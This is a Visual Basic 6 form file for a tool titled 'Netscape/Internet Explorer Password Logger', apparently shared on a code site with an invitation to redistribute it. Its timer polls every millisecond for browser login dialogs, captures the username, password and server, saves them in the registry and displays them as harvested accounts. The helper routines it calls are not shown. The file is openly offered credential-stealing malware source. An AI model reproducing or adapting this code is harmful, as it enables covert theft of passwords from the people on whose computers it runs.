VERSION 5.00
Begin VB.Form frmLog 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Netscape/Internet Explorer Password Logger"
   ClientHeight    =   2775
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4680
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmLog.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2775
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtStatus 
      Appearance      =   0  'Flat
      Height          =   2295
      Left            =   240
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Text            =   "frmLog.frx":0E42
      Top             =   360
      Width           =   4335
   End
   Begin VB.Timer tmrLog 
      Interval        =   1
      Left            =   1800
      Top             =   1320
   End
   Begin VB.Label lblStatus 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Status:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   600
   End
End
Attribute VB_Name = "frmLog"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'**********************************
'* CODE BY: PATRICK MOORE (ZELDA) *
'* Feel free to re-distribute or  *
'* Use in your own projects.      *
'* Giving credit to me would be   *
'* nice :)                        *
'*                                *
'* Please vote for me if you find *
'* this code useful :]   -Patrick *
'**********************************
'http://members.nbci.com/erx931/VB/
'
'PS: Please look for more submissions to PSC by me
'    I've recently been working on a lot of them.
'    :))  All my submissions are under author name
'    "Patrick Moore (Zelda)"

Sub Status(stat As String)
'Add Status to the textbox
txtStatus = txtStatus & stat & vbCrLf
End Sub


Private Sub tmrLog_Timer()
Dim WebWin As Long, Web_Info As WebInfo, Pass As String

'Find the IE Login window
WebWin = FindIELogin

'If the IE Login window isn't open,
'find the Netscpe login window
If WebWin = 0 Then WebWin = FindNetscapeLogin

'See if the window is open
If WebWin > 0 Then
    'The IE Login or the Netscape Login window
    'is open!  Let's go grab the user and pass
    Web_Info = GetLoginInfo
    
    'Make sure the username isn't blank
    If Web_Info.Username <> "" Then
        'See if we already have that account stored
        Pass = GetSetting("WebPWS", "StoredAccounts", Web_Info.Username, "")
        If Pass = "" Then
            'If not, store it
            SaveSetting "WebPWS", "StoredAccounts", Web_Info.Username, "Server: " & Web_Info.Server & vbCrLf & "Password: " & Web_Info.Password
            Status "[" & Format(Time, "HH:MM:SS") & "] Account Stored: " & Web_Info.Username & ":" & Web_Info.Password
        End If
    End If
End If
End Sub

Private Sub txtStatus_Change()
'Set the cursor to the last character in the textbox
txtStatus.SelStart = Len(txtStatus.Text)
End Sub
